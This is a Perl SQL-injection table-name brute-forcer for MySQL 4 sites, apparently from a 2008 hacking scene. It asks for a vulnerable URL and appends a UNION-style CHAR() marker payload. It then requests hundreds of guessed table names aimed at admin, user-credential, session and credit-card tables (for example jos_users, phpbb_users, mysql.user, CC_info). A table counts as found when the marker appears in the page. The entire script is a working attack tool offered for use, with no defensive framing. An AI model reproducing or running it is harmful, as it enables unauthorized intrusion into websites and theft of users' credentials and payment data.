#!/usr/bin/perl
##
#      table_name mysql 4 Fuzzer
#  By Qabandi -- from Kuwait PEACE -- iqa@hotmail.fr
#     Private use for Muslims only!
##    12/20/2008 1:59:53 PM
use HTTP::Request;
use LWP::UserAgent;
system('cls');
system('title table_name mysql 4 Fuzzer - by Qabandi');
$Q  = chr(0x42).chr(0x79).chr(0x20).chr(0x51).chr(0x61).chr(0x62);
$Q .= chr(0x61).chr(0x6e).chr(0x64).chr(0x69).chr(0x20).chr(0x7c);
$Q .= chr(0x20).chr(0x69).chr(0x71).chr(0x61).chr(0x40).chr(0x68);
$Q .= chr(0x6f).chr(0x74).chr(0x6d).chr(0x61).chr(0x69).chr(0x6c);
$Q .= chr(0x2e).chr(0x66).chr(0x72);
$Q2 = "CHAR(113,97,98,97,110,100,105)";
print"\n";
print "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t<   table_name mysql 4 Fuzzer         <\n";
print "\t<                                     <\n";
print "\t<  by Qabandi    | iqa[at]hotmail.fr  <\n";
print "\t<    from                   Kuwait    <\n";
print "\t<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n";
print "\n";


print "~ Enter First Part:\n=> ";
$site=<STDIN>;
chomp $site;

print "\n";

print "~ Enter Second Part:\n=> ";
$second=<STDIN>;
chomp $second;
print "\n";
  print "~ End with:\n=> ";
 $end=<STDIN>;
chomp $end;
 print "\n";
if ( $site !~ /^http:/ ) {
$site = 'http://' . $site;
}
if ( $site !~ /\/$/ ) {
$site = $site;
}
$finalURL = $site.$Q2.$second."+from+{{whatevs}}".$end;
print "\n->";
print $Q;
print "\n";
print "->Final URL: \n->".$finalURL."\n";
print "->BISMILA ..\n\n\n";
@path2=('tbladmins', 'sort', '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user', 'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator', 'administrators', 'adminrights', 'admins', 'adminuser', 'art', 'article_admin', 'articles', 'artikel', '\xc3\x83\xc3\x9c\xc3\x82\xc3\xab', 'aut', 'author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'images', 'index', 'info', 'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login', 'login_admin', 'login_admins', 'login_user', 'login_users', 'logins', 'logon', 'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users', 'member', 'memberlist', 'members', 'minibbtable_users', 'mitglieder', 'movie', 'movies', 'mybb_users', 'mysql', 'mysql.user', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_authors', 'nuke_bbconfig', 'nuke_config', 'nuke_popsettings', 'nuke_users', '\xc3\x93\xc3\x83\xc2\xbb\xc2\xa7', 'obb_profiles', 'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user', 'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins', 'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member', 'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members', 'user', 'user_admin', 'user_info', 'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins', 'username', 'usernames', 'userrights', 'users', 'vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members', 'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers', 'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'ACT_INFO', 'ActiveDataFeed', 'Category', 'CategoryGroup', 'ChicksPass', 'ClickTrack', 'Country', 'CountryCodes1', 'CustomNav', 'DataFeedPerformance1', 'DataFeedPerformance2', 'DataFeedPerformance2_incoming', 'DataFeedShowtag1', 'DataFeedShowtag2', 'DataFeedShowtag2_incoming', 'dtproperties', 'Event', 'Event_backup', 'Event_Category', 'EventRedirect', 'Events_new', 'Genre', 'JamPass', 'MyTicketek', 'MyTicketekArchive', 'News', 'Passwords by usage count', 'PerfPassword', 'PerfPasswordAllSelected', 'Promotion', 'ProxyDataFeedPerformance', 'ProxyDataFeedShowtag', 'ProxyPriceInfo', 'Region', 'SearchOptions', 'Series', 'Sheldonshows', 'StateList', 'States', 'SubCategory', 'Subjects', 'Survey', 'SurveyAnswer', 'SurveyAnswerOpen', 'SurveyQuestion', 'SurveyRespondent', 'sysconstraints', 'syssegments', 'tblRestrictedPasswords', 'tblRestrictedShows', 'Ticket System Acc Numbers', 'TimeDiff', 'Titles', 'ToPacmail1', 'ToPacmail2', 'Total Members', 'UserPreferences', 'uvw_Category', 'uvw_Pref', 'uvw_Preferences', 'Venue', 'venues', 'VenuesNew', 'X_3945', 'stone list', 'tblArtistCategory', 'tblArtists', 'tblConfigs', 'tblLayouts', 'tblLogBookAuthor', 'tblLogBookEntry', 'tblLogBookImages', 'tblLogBookImport', 'tblLogBookUser', 'tblMails', 'tblNewCategory', 'tblNews', 'tblOrders', 'tblStoneCategory', 'tblStones', 'tblUser', 'tblWishList', 'VIEW1', 'viewLogBookEntry', 'viewStoneArtist', 'vwListAllAvailable', 'CC_info', 'CC_username', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user', 'table_user', 'email', 'mail', 'bulletin', 'cc_info', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login', 'UserAdmin', 'Admins', 'Login', 'Logins', 'administrator', 'administrators', 'tb_administrators', 'news_admin', 'news_admins', 'new_admin', 'new_admins', 'editors', 'editor', 'news_editor', 'news_editors', 'tb_editor', 'tbl_editor', 'tbl_administrator', 'tbl_administrators','artist_login',
'artists',
'artist_admin',
'artist_admins',
'artists_admin',
'artists_login',
'artistlogin',
'artistadmin',
'artist_users',
'artists_user',
'artist_user',
'mysql.user','wordpress.wp_users'

);
foreach $ways(@path2){
$final=$site.$Q2.$second." from ".$ways.$end;
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
if($response->content =~ /qabandi/
){
print " \n [FOUND!] <-> $ways\n\n";
}else{
print ".";
}
}
##
# By Qabandi -- iqa@hotmail.fr -- from kuwait PEACE
##
